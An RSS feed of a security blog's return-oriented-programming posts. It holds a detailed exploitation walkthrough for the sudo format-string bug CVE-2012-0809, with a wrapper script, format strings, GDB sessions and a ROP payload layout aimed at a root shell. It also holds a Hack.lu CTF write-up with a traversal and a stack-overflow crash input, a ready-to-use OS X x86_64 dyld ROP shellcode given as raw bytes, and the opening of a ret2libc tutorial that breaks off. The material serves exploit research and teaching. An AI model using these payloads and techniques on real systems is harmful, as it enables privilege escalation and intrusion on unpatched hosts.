<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: return-oriented-programming</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>Exploiting Sudo format string vunerability</title>
  <link>http://realjenius.com/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2012-02-16T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2012/02/16/exploiting-sudo-format-string-vunerability.html</guid>
  <description><![CDATA[
     <p>In this post we will show how to exploit format string vulnerability in sudo 1.8 that reliably bypasses FORTIFY_SOURCE, ASLR, NX and Full RELRO protections. Our test environment is Fedora 16 which is shipped with a vulnerable sudo version (sudo-1.8.2p1).</p>

<h2 id="the-vulnerability">The vulnerability</h2>

<p>Vulnerability detail can be found in <a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0809" target="_blank">CVE-2012-0809</a>. In summary, executing sudo in debug mode with crafted argv[0] will trigger the format string bug. E.g:</p>

<pre>$ ln -s /usr/bin/sudo ./%n
$ ./%n -D9</pre>

<h2 id="the-exploit">The exploit</h2>

<p>Though above format string vulnerability is straight, it is not easy to exploit on modern Linux distributions. sudo binary in Fedora 16 comes with:</p>

<ul>
  <li><a href="http://fedoraproject.org/wiki/Security/Features#Compile_Time_Buffer_Checks_.28FORTIFY_SOURCE.29" target="_blank">FORTIFY_SOURCE</a></li>
  <li>Full <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank">ASLR</a> (including <a href="http://en.wikipedia.org/wiki/Position-independent_code#Position-independent_executables">PIE</a>)</li>
  <li>Full <a href="http://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/" target="_blank">RELRO</a></li>
  <li><a href="http://en.wikipedia.org/wiki/Executable_space_protection" target="_blank">NX</a> (DEP)</li>
</ul>

<p>In order to exploit format string bug we have to bypass all above protections, but thanks to this local bug, we can disable ASLR easily with resources limit trick (another notes, prelink is enabled on Fedora 16 so it also disable ASLR from local exploits). As a consequence, NX can be defeated with return-to-libc/ROP with known addresses. The most difficult part is bypassing FORTIFY_SOURCE.</p>

<h3 id="bypassing-fortifysource">Bypassing FORTIFY_SOURCE</h3>

<p>We just follow <a href="http://www.phrack.org/issues.html?issue=67&amp;id=9&amp;mode=txt" target="_blank">“A Eulogy for Format Strings”</a> article from Phrack #67 by Captain Planet wit very detail steps to bypass FORTIFY_SOURCE. In summary, there is an integer overflow bug in FORTIFY_SOURCE patch, by exploiting this we can turn off <span style="line-height: normal">_IO_FLAGS2_FORTIFY bit in file stream and use “%n” operation from a writable address. Following steps will be done:</span><span style="line-height: normal"> </span></p>

<ol>
  <li>Set nargs to a big value so (nargs * 4) will be truncated to a small integer value, the perfect value is nargs = 0×40000000, so nargs * 4 = 0. The format string to achieve this looks like: “%*1073741824$”</li>
  <li><span style="line-height: normal">Turn off </span>_IO_FLAGS2_FORTIFY on stderr file stream</li>
  <li>Reset nargs = 0 to bypass check loop</li>
</ol>

<p>Let examine #2 and #3 in detail. We create a wrapper (sudo-exploit.py) then fire a GDB session:</p>

<pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python
import os
import sys

def exploit(vuln):
    fmtstring = "%*123$ %*456$ %1073741824$"
    args = [fmtstring, "-D9"]
    env = os.environ
    os.execve(vuln, args, env)

if __name__ == "__main__":
    if len(sys.argv) &lt; 2:
        usage()
    else:
        exploit(sys.argv[1])
</pre>

<pre class="brush: plain; title: ; notranslate" title=""># ulimit -s unlimited
# gdb -q /usr/bin/sudo
Reading symbols from /usr/bin/sudo...Reading symbols from /usr/lib/debug/usr/bin/sudo.debug...done.
done.
gdb$ set exec-wrapper ./sudo-exploit.py
gdb$ run
process 2149 is executing new program: /usr/bin/sudo
*** invalid %N$ use detected ***

Program received signal SIGABRT, Aborted.
gdb$ bt
#0  0x40038416 in ?? ()
#1  0x400bc98f in __GI_raise (sig=0x6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:64
#2  0x400be2d5 in __GI_abort () at abort.c:91
#3  0x400fbe3a in __libc_message (do_abort=0x1, fmt=0x401f3dea "%s") at ../sysdeps/unix/sysv/linux/libc_fatal.c:198
#4  0x400fbf64 in __GI___libc_fatal (message=0x401f5a6c "*** invalid %N$ use detected ***n") at ../sysdeps/unix/sysv/linux/libc_fatal.c:209
#5  0x400d1df5 in _IO_vfprintf_internal (s=0xbff42498, format=&lt;optimized out&gt;, ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf.c:1771
#6  0x400d566b in buffered_vfprintf (s=0x40234920, format=&lt;optimized out&gt;, args=&lt;optimized out&gt;) at vfprintf.c:2207
#7  0x400d0cad in _IO_vfprintf_internal (s=0x40234920, format=0x4023b958 "%*123$ %*456$ %1073741824$: settings: %s=%sn", ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf.c:1256
#8  0x401958a1 in ___vfprintf_chk (fp=0x40234920, flag=0x1, format=0x4023b958 "%*123$ %*456$ %1073741824$: settings: %s=%sn", ap=0xbff42b78  &lt;incomplete sequence 340&gt;) at vfprintf_chk.c:35
#9  0x400094a0 in vfprintf (__ap=0xbff42b78  &lt;incomplete sequence 340&gt;, __fmt=&lt;optimized out&gt;, __stream=&lt;optimized out&gt;) at /usr/include/bits/stdio2.h:128
#10 sudo_debug (level=0x9, fmt=0x4000dff3 "settings: %s=%s") at ./sudo.c:1202
#11 0x400082cd in parse_args (argc=0x1, argv=0x4023b730, nargc=0xbff42d20, nargv=0xbff42d24, settingsp=0xbff42d28, env_addp=0xbff42d2c) at ./parse_args.c:413
#12 0x40002890 in main (argc=0x2, argv=0xbff42df4, envp=0xbff42e00) at ./sudo.c:203

gdb$ list vfprintf.c:1688
1683	    /* Fill in the types of all the arguments.  */
1684	    for (cnt = 0; cnt &lt; nspecs; ++cnt)
1685	      {
1686		/* If the width is determined by an argument this is an int.  */
1687		if (specs[cnt].width_arg != -1)
1688		  args_type[specs[cnt].width_arg] = PA_INT;
1689
1690		/* If the precision is determined by an argument this is an int.  */
1691		if (specs[cnt].prec_arg != -1)
1692		  args_type[specs[cnt].prec_arg] = PA_INT;
gdb$ break vfprintf.c:1688
Breakpoint 1 at 0x400d1c5b: file vfprintf.c, line 1688.

gdb$ run
process 2157 is executing new program: /usr/bin/sudo
   0x400d1c53 &lt;_IO_vfprintf_internal+4531&gt;:	mov    eax,DWORD PTR [edi+0x20]
   0x400d1c56 &lt;_IO_vfprintf_internal+4534&gt;:	cmp    eax,0xffffffff
   0x400d1c59 &lt;_IO_vfprintf_internal+4537&gt;:	je     0x400d1c68 &lt;_IO_vfprintf_internal+4552&gt;
=&gt; 0x400d1c5b &lt;_IO_vfprintf_internal+4539&gt;:	mov    edx,DWORD PTR [ebp-0x484]
   0x400d1c61 &lt;_IO_vfprintf_internal+4545&gt;:	mov    DWORD PTR [edx+eax*4],0x0
   0x400d1c68 &lt;_IO_vfprintf_internal+4552&gt;:	mov    eax,DWORD PTR [edi+0x1c]
   0x400d1c6b &lt;_IO_vfprintf_internal+4555&gt;:	cmp    eax,0xffffffff
   0x400d1c6e &lt;_IO_vfprintf_internal+4558&gt;:	je     0x400d1c7d &lt;_IO_vfprintf_internal+4573&gt;

Breakpoint 1, _IO_vfprintf_internal (s=0xbfe48748, format=&lt;optimized out&gt;, ap=0xbfe48e28  &lt;incomplete sequence 340&gt;) at vfprintf.c:1688
1688		  args_type[specs[cnt].width_arg] = PA_INT;

gdb$ p &amp;s-&gt;_flags2
$1 = (_IO_FILE **) 0xbf845310
gdb$ p/d (char*)&amp;s-&gt;_flags2 - *(int)($ebp-0x484)
$2 = 11396

gdb$ p &amp;nargs
$3 = (size_t *) 0xbf844e74
gdb$ p/d (char*)&amp;nargs - *(int)($ebp-0x484)
$4 = 1924
</pre>

<p><em>s-&gt;_flags2</em> and <em>nargs</em> is on stack with fixed relative offsets to current stack pointer, so we can adjust offsets according to relative stack addresses to fulfill #2 &amp; #3. Let do this again and calculate correct values when we have final format string for the exploit.</p>

<h3 id="bypassing-full-relro">Bypassing Full RELRO</h3>

<p>We can now use “%n” primitive to write anywhere with any value, but where to write to? sudo binary is compiled with Full RELRO, this means we cannot write to GOT entry or dynamic-&gt;.fini to redirect the execution as they are read-only. The idea here is simple: we try to overwrite function pointer in libc or ld-linux and hope it will be called later in program to trigger redirection. This works smoothly with sudo case.</p>

<pre class="brush: plain; title: ; notranslate" title=""># ln -s /usr/bin/sudo ./%x
# ulimit -s unlimited
# gdb -q ./%x
gdb$ list sudo.c:204
199	    memset(&amp;user_details, 0, sizeof(user_details));
200	    user_info = get_user_info(&amp;user_details);
201
202	    /* Parse command line arguments. */
203	    sudo_mode = parse_args(argc, argv, &amp;nargc, &amp;nargv, &amp;settings, &amp;env_add);
204	    sudo_debug(9, "sudo_mode %d", sudo_mode);
205
206	    /* Print sudo version early, in case of plugin init failure. */
207	    if (ISSET(sudo_mode, MODE_VERSION)) {
208		printf("Sudo version %sn", PACKAGE_VERSION);

gdb$ break sudo.c:207
gdb$ run -D9
4000e036: settings: 9=en_US.UTF-8
4000e0bc: settings: %x=en_US.UTF-8
4000e0c5: settings: true=en_US.UTF-8
4000e0fc: settings: 10.0.2.15/255.255.255.0 fe80::a00:27ff:fe9e:e68c/ffff:ffff:ffff:ffff::=en_US.UTF-8
a0001: sudo_mode -1078177084
Breakpoint 1, main (argc=0x2, argv=0xbfbc5394, envp=0xbfbc53a0) at ./sudo.c:207
207	    if (ISSET(sudo_mode, MODE_VERSION)) {

gdb$ vmmap libc
Start	End	Perm	Name
0x400a8000 0x4024d000 r-xp /lib/libc-2.14.90.so
0x4024d000 0x4024f000 r--p /lib/libc-2.14.90.so
0x4024f000 0x40250000 rw-p /lib/libc-2.14.90.so
gdb$ x/8wx 0x4024f000
0x4024f000:	0x401da990	0x40122490	0x40121e10	0x401227a0
0x4024f010:	0x4013fc60	0x40122fb0	0x40027f20	0x401223e0
gdb$ x/8i 0x40121e10
0x40121e10 &lt;__GI___libc_malloc&gt;:	sub    esp,0x3c
0x40121e13 &lt;__GI___libc_malloc+3&gt;:	mov    DWORD PTR [esp+0x2c],ebx
0x40121e17 &lt;__GI___libc_malloc+7&gt;:	call   0x401db813 &lt;__i686.get_pc_thunk.bx&gt;
0x40121e1c &lt;__GI___libc_malloc+12&gt;:	add    ebx,0x12d1d8
0x40121e22 &lt;__GI___libc_malloc+18&gt;:	mov    DWORD PTR [esp+0x30],esi
0x40121e26 &lt;__GI___libc_malloc+22&gt;:	mov    esi,DWORD PTR [esp+0x40]
0x40121e2a &lt;__GI___libc_malloc+26&gt;:	mov    DWORD PTR [esp+0x34],edi
0x40121e2e &lt;__GI___libc_malloc+30&gt;:	mov    DWORD PTR [esp+0x38],ebp

gdb$ set *0x4024f008=0x41414141
gdb$ continue
Program received signal SIGSEGV, Segmentation fault.
0x400bee20 &lt;realloc@plt+0&gt;:	jmp    DWORD PTR [ebx+0x10]
0x400bee26 &lt;realloc@plt+6&gt;:	push   0x8
0x400bee2b &lt;realloc@plt+11&gt;:	jmp    0x400bee00
=&gt; 0x400bee30 &lt;malloc@plt+0&gt;:	jmp    DWORD PTR [ebx+0x14]
0x400bee36 &lt;malloc@plt+6&gt;:	push   0x10
0x400bee3b &lt;malloc@plt+11&gt;:	jmp    0x400bee00
0x400bee40 &lt;memalign@plt+0&gt;:	jmp    DWORD PTR [ebx+0x18]
0x400bee46 &lt;memalign@plt+6&gt;:	push   0x18
0x400bee30 in malloc@plt () from /lib/libc.so.6
gdb$ x/x $ebx+0x14
0x4024f008:	0x41414141
</pre>

<h3 id="bypassing-nx">Bypassing NX</h3>

<p>The last part of our exploit is bypassing NX and this can be done via libc ROP gadgets as its address now is fixed. We spray the environment with target payload and use a stack pivot gadget <em>(add esp, 0xNNN)</em> to jump to it. Out payload will look like:</p>

<pre>[ ROP NOPs | setuid, execve, 0, &amp;/bin/sh, nullptr, nullptr ]</pre>

<p>Or we can use another simple version to avoid NULL byte:</p>

<pre>[ ROP NOPs | execve, exit, &amp;./custom_shell, nullptr, nullptr ]</pre>

<p>Where <em>“./custom_shell”</em> is an available string in libc (e.g: “./0123456789:;&lt;=&gt;?”)</p>

<h3 id="exploit-code">Exploit code</h3>

<p>To not spoil the fun of people who may want to try it, I will post it later <img src="http://vnsec-new.cloudapp.net/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" /> </p>

<h2 id="further-notes">Further notes</h2>

<h3 id="fortifysource-on-x86x64">FORTIFY_SOURCE on x86_x64</h3>

<p>The technique we use here to bypass FORTIFY_SOURCE failed work on x86_64 as we can not find a *nargs *value (32-bit) that satisfies: (nargs * 4) is truncated to a small 64-bit value. I hope someone will find new ways to bypass it on x86_64.</p>

<h3 id="reliability-of-exploit">Reliability of exploit</h3>

<p>Though we disable ASLR, stack address is not affected and sometimes there is a gap between current stack pointer and our payload in environment and we may fail to perform stack pivoting. In order to achieve reliability, we have to spray the environment carefully. <em>Update: 65K environment is enough for 100% reliability on Fedora (thanks to brainsmoke)</em></p>

<h2 id="span-stylecolor-ff0000updatespan-exploit-on-grsecuritypax-enabled-kernel"><span style="color: #ff0000">Update:</span> exploit on grsecurity/PaX-enabled kernel</h2>

<p>Our exploit on Fedora16 with vanilla kernel relies on a single address: libc base address. With PaX’s ASLR implementation we have to bruteforce for 20-bits and this is definitely hard with proper ASLR. Though “ulimit -s unlimited” has no real effect on grsecurity/PaX-enabled kernel, it can help to reduce 4-bits entropy of library addresses. 16-bits bruteforcing still requires average 32K+ runs and is hopeless with grsecurity’s bruteforce deterring (15 minutes locked out of system for a failed try).</p>

<p>We had to re-work to make our exploit has a chance to win ASLR. Obviously, we cannot pick any address of library or binary to overwrite, the only way now is to overwrite available addresses on stack. *Fortunately*, we can overwrite saved EIP of sudo_debug() directly as there is pointers to it on stack. Following GDB session shows that:</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ backtrace
#0  sudo_debug (level=0x9, fmt=0xb772c013 "settings: %s=%s") at ./sudo.c:1192
#1  0xb77262ed in parse_args (argc=0x1, argv=0xb7734dc8, nargc=0xbfffe720, nargv=0xbfffe724, settingsp=0xbfffe728, env_addp=0xbfffe72c) at ./parse_args.c:413
#2  0xb77208b0 in main (argc=0x2, argv=0xbfffe7f4, envp=0xbfffe800) at ./sudo.c:203
gdb$ pref 0xb77262ed
Found 5 results:
0xbfffe030 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe060 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe0c0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe0f0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
0xbfffe2a0 --&gt; 0xbfffe56c --&gt; 0xb77262ed (0xb77262ed &lt;parse_args+1837&gt;:	mov    eax,DWORD PTR [esp+0x2c])
</pre>

<p>By chosing to return to near by function inside sudo binary (e.g my_execve()), we can effectively reduce the entropy down to 4-bits with a short write (%hn):</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ run
gdb$ p my_execve
$1 = {int (const char *, char * const *, char * const *)} 0xb7721fe0 &lt;my_execve&gt;

gdb$ run
gdb$ p my_execve
$2 = {int (const char *, char * const *, char * const *)} 0xb7726fe0 &lt;my_execve&gt;
</pre>

<p>This is a quite good improvement, even on PaX-enabled kernel we only need few tries to get a root shell. But with grsecurity’s bruteforce deterring, I don’t know how long it will take (maybe days) as I failed to get a shell after a day. Though we have a good exploit against real ASLR, it is still far from ideal “one-shot exploit”. One-shot exploit can only be done if we are able to leak the library/binary address then (ab)use it on the fly.</p>

<p>In TODO part of Phrack 67 article, the author mentioned that he could not stabilize the use of copy (read+write) primitive when abusing printf(). I decided to reproduce his experiment under a new condition: stack limit is lifted with “ulimit -s unlimited”. After hundred of tries for different offsets, we can stabilize the copy, which means we successfully leak the address and abuse it on the fly. Hunting for address on stack is easy now, we can choose to pick saved EIP of sudo_debug itself or any address of libc available on stack (e.g from __vfprintf_internal function). Then we calculate the offset from there to an exec() function, copy (read+write) it to overwrite saved EIP of sudo_debug() with a format string looks like “%*123$x %456x %789$n”. By repeating the write step, we are able to create custom arguments on stack to prepare for a valid execution via exec() and achieve a one-shot pwn.</p>

<h3 id="notes">Notes</h3>

<ul>
  <li>We rarely find pointer to save EIP of functions on stack for direct overwrite like this case</li>
  <li>Direct parameter access is 12-bytes each unlike 4-bytes each in normal format string exploit. This will limit your ability to write to arbitrary pointer on stack.</li>
  <li>Copy primitive uses unsigned value, so if library/binary base is mapped at high address (e.g 0xb7NNNNNN) we will fail to leak the address on the fly (it is still an open problem, hope someone can find out). With PaX’s ASLR, we are in luck as it maps library/binary start at something like 0x2NNNNNNN in the effect of “ulimit -s unlimited” (so it actually has effect :)).</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Hack.lu CTF 2011: Nebula Death Stick Services writeup</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-10-03T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/10/03/hack-lu-ctf-2011-nebula-death-stick-services-writeup.html</guid>
  <description><![CDATA[
     <h2 id="challenge-information">Challenge Information</h2>

<blockquote>
  <p>Death Sticks are a totally illegal drug in the universe.<br />
However, somehow a company called Death Stick Services has managed to get a huge trade volume by selling Death Sticks directly and anonymously to their costumers.<br />
Seems like nobody has the power to stop them, so the Galactic’s Secret Service ordered YOU and your Special Forces team to get a Shell on Death Stick Service’s server and search for any evidence on how to take them down!<br />
May the force be with you.</p>

  <p>http://ctf.hack.lu:2010/</p>
</blockquote>

<h2 id="analysis">Analysis</h2>

<p><em>Thanks rd for helping Analysis part.</em></p>

<p>Checking around http://ctf.hack.lu:2010/ page, I found that there is a directory traversal vulnerability (<em>http://ctf.hack.lu:2010/?page=../../../../etc/resolv.conf</em>). Together with “<em>./a.out</em>” from HTTP response header, I managed to download the binary via this request <em>http://ctf.hack.lu:2010/?page=../a.out</em>.</p>

<p>“<em>a.out</em>” binary is a 32 bit x86 Linux binary, running on Ubuntu 10.10 server. There is a vulnerability in query parsing function parse_params as below.</p>

<p><a href="/wp/storage/uploads/2011/10/parse_params.jpg"><img class="aligncenter size-full wp-image-1236" title="parse_params" src="/wp/storage/uploads/2011/10/parse_params.jpg" alt="parse_params" width="372" height="407" /></a></p>

<p><strong>parse_params()</strong> function basically looks ‘<em>?</em>‘ and ‘<em>=</em>‘ in order to parse the input query such as <em>/?page=blah</em>, and then uses the different in length (<strong>len</strong>) to store parameter name and its value to the buffer on the stack of the caller function (<strong>handle_connection()</strong>). From above code, you can see that if we input in reverse order of ‘<em>?</em>‘ and ‘<em>=</em>‘ such as* /=blah?*, <strong>len</strong> value will be negative but it still pass the the condition check because of signed comparison. This leads into a traditional stack buffer overflow.</p>

<blockquote>
  <p>$ python2 -c ‘print “GET /=” + “A”*60 + “? HTTP/”‘|nc -v localhost 2010<br />
..<br />
(gdb) run<br />
Starting program: /home/jail/ctf/hack.lu/o500/a.out<br />
Notice: Nebulaserv – A Webserver for Nebulacorp</p>

  <p>Notice: Starting up!</p>

  <ul>
    <li>Accepting requests on port 2010<br />
[New process 4626]  </li>
    <li>
      <p>Got request with length 0: 127.0.0.1:35695 – GET /=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA? HTTP/</p>
    </li>
    <li>Got param: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt; with value  </li>
    <li>Opening ./nebula/index – 404 Not Found</li>
  </ul>

  <p>Program received signal SIGSEGV, Segmentation fault.<br />
[Switching to process 4626]<br />
0×41414141 in ?? ()</p>
</blockquote>

<h2 id="exploit">Exploit</h2>

<p>The binary has NX and ASLR enabled so we have to leak libc info from server for ROP/ret2libc exploit. During the game, to save time we utilized shell on the same server from Nebula DB challenge to retrieved libc, then constructed a ROP payload to call a custom shell script as <em>system(“/tmp/sh”)</em>. After the game, we investigate more to see if we can exploit without any knowledge of server. And here is the way we do:</p>

<h3 id="retrieve-libc">Retrieve libc</h3>

<p>In **handle_connection() **function socket fd is increased for every new connection. Though we can find this value on stack, it is still difficult to find code chunks to write back something valuable to our socket. Instead, we can utilize the directory traversal bug above to retrieve libc via this request: <span style="font-style: italic">http://ctf.hack.lu:2010/?page=../../../../lib/libc.so.6</span></p>

<h3 id="construct-rop-payload">Construct ROP payload</h3>

<p>With libc in hand, we know exact offset to any libc function and ROP payload can be constructed using “<a href="http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/" target="_self">data re-use way</a>” via <em>sprintf() – *which can perform byte-per-byte transfer the same as *strcpy() – *or “<a href="http://auntitled.blogspot.com/2011/09/rop-with-common-functions-in.html" target="_blank">ROP with common functions in Ubuntu/Debian x86</a>“</em>. *</p>

<h3 id="the-flag">The flag</h3>

<p>The flag was put in a file with strange name so you cannot guess and get it via directory traversal bug.</p>

<pre class="brush: plain; title: ; notranslate" title="">$ ls -l /home/nebulaserver

total 24

-r-xr-x--- 1 root nebulaserver 11195 2011-09-11 20:50 a.out

-r--r----- 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD

drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula

-r-xr-x--- 1 root nebulaserver    82 2011-09-20 17:00 restart.sh

$ cat /home/nebulaserver/IguessTHISisTHEflagDOOD

Flag: R0PPINGy0urWAYinDUDE

</pre>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ ls -l /home/nebulaserver
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  total 24
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver 11195 2011-09-11 20:50 a.out
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r&#8211;r&#8212;&#8211; 1 root nebulaserver    27 2011-09-20 13:19 IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  drwxr-xr-x 3 root nebulaserver  4096 2011-09-11 20:22 nebula
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  -r-xr-x&#8212; 1 root nebulaserver    82 2011-09-20 17:00 restart.sh
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $ cat /home/nebulaserver/IguessTHISisTHEflagDOOD
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  Flag: R0PPINGy0urWAYinDUDE
</div>

<div id="_mcePaste" style="width: 1px;height: 1px">
  $
</div>

<ul>
  <li>*</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Yet another universal OSX x86_64 dyld ROP shellcode</title>
  <link>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-07-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</guid>
  <description><![CDATA[
     <p>This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an <a href="http://gdtr.wordpress.com/2011/07/23/universal-rop-shellcode-for-os-x-x64/">Universal ROP shellcode for OS X x64</a> with detail steps and explanation. If you don’t have a chance to read above post, the basic ideas are:</p>

<ul>
  <li>Copy stubcode to a writable area (.data section)</li>
  <li>Make that area RWX</li>
  <li>Jump to RWX area and execute stubcode</li>
  <li>Stubcode will transfer normal shellcode to RWX area and execute it</li>
  <li>All the ROP gadgets are from dyld module which is not randomized</li>
</ul>

<p>In this post, we shows another OSX x86_64 dyld ROP shellcode which is more simple. We employ the same ideas with some minor differences in implementation:</p>

<ul>
  <li>Instead of using long gadgets with “leave”, we use direct, short gadgets from unintended code</li>
  <li>Calling mprotect() via syscall</li>
  <li>Short stubcode (7 bytes) using memcpy() to transfer payload</li>
</ul>

<p>Here is the ROP shellcode with explanation:</p>

<pre class="brush: plain; title: ; notranslate" title=""># store [target], stubcode
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0xc353575e545a5b90 # =&gt; rsi = stubcode
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc74f80 # =&gt; rdi
0x00007fff5fc24d26 # mov [rdi+0x80] rsi; stubcode =&gt; [target]
# load rdx, 0x7 (prot RWX)
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75001 # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1]
0x00007fff5fc219c3 # pop rbp ; add [rax] al ; add cl cl
0x00007fff5fc75000 # =&gt; rbp
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000000007 # =&gt; rsi
0x00007fff5fc14149 # mov edx esi ; add [rax] al ; add [rbp+0x39] cl =&gt; rdx = 0x7
# load rsi, 4096 (size)
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000001000 # =&gt; rsi = 4096
# load rax, mprotect_syscal
0x00007fff5fc24cdc # pop rdi
0x000000000200004b # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1] =&gt; rax = 0x200004a (mprotect syscall)
# load rdi, target
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75000 # =&gt; rdi = target
# syscall
0x00007fff5fc1c76d # mov r10, rcx; syscall  =&gt; mprotect(target, 4096, 7)
0x00007fff5fc75000 # jump to target, execute stubcode
# stubcode
# 5B                pop rbx     # rbx -&gt; memcpy()
# 5A                pop rdx     # rdx -&gt; size
# 54                push rsp    # src -&gt; &amp;shellcode
# 5E                pop rsi     # src -&gt; &amp;shellcode
# 57                push rdi    # jump to target when return from memcpy()
# 53                push rbx    # memcpy()
# C3                ret         # execute memcpy(target, &amp;shellcode, size)
0x00007fff5fc234f0 # &amp;memcpy()
0x0000000000000200 # shellcode size = 512
&lt;your shellcode here&gt;
</pre>

<p>You can verify those gadgets and find more here: <a href="http://goo.gl/p35vY">http://goo.gl/p35vY</a></p>

<p>Ready to use shellcode:</p>

<pre class="brush: plain; title: ; notranslate" title="">"xeexe7xc0x5fxffx7fx00x00x90x5bx5ax54x5ex57x53xc3"
"xdcx4cxc2x5fxffx7fx00x00x80x4fxc7x5fxffx7fx00x00"
"x26x4dxc2x5fxffx7fx00x00xdcx4cxc2x5fxffx7fx00x00"
"x01x50xc7x5fxffx7fx00x00xc0xddxc1x5fxffx7fx00x00"
"xc3x19xc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xeexe7xc0x5fxffx7fx00x00x07x00x00x00x00x00x00x00"
"x49x41xc1x5fxffx7fx00x00xeexe7xc0x5fxffx7fx00x00"
"x00x10x00x00x00x00x00x00xdcx4cxc2x5fxffx7fx00x00"
"x4bx00x00x02x00x00x00x00xc0xddxc1x5fxffx7fx00x00"
"xdcx4cxc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"x6dxc7xc1x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xf0x34xc2x5fxffx7fx00x00x00x02x00x00x00x00x00x00"
</pre>

  ]]></description>
</item>

	<item>
  <title>Simple Mac OS X ret2libc exploit (x86)</title>
  <link>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2010-10-05T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2010/10/05/simple-mac-os-x-ret2libc-exploit-x86.html</guid>
  <description><![CDATA[
     <p>Talking about buffer overflow exploit on x86, Mac OS X is the most easy and hacker friendly target compare to Linux or Windows. OS X always loads **/usr/lib/dyld **at a fixed location and it contains a lot of helper stubs to launch the exploit. If you want something advanced likes ROP (Return-Oriented-Programming) exploit you may have a look at “<a href="http://trailofbits.com/2010/07/21/mac-os-x-return-oriented-exploitation/" target="_blank">Mac OS X Return-Oriented Exploitation</a>” and thorough step-by-step guide “<a href="http://www.exploit-db.com/osx-rop-exploits-evocam-case-study/" target="_blank">OSX ROP Exploit – EvoCam Case Study</a>“. But actually, we don’t need ROP for 32-bit exploitation on OS X, simple ret2libc is enough and straightforward to implement. Let take a look at multi-stage ret2libc exploit on OS X.</p>

<h2 id="the-target">The target</h2>

<p>Under OSX, dyld is always loaded at a fixed location with __IMPORT page is RWX as shown below:</p>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe00000-8fe0b000 [   44K] r-x/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe0b000-8fe0c000 [    4K] r-x/rwx SM=PRV  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
  #__TEXT                 8fe0c000-8fe42000 [  216K] r-x/rwx SM=COW  /usr/lib/dyld
</div>

<div id="_mcePaste" style="width: 1px;height: 1px;overflow: hidden">
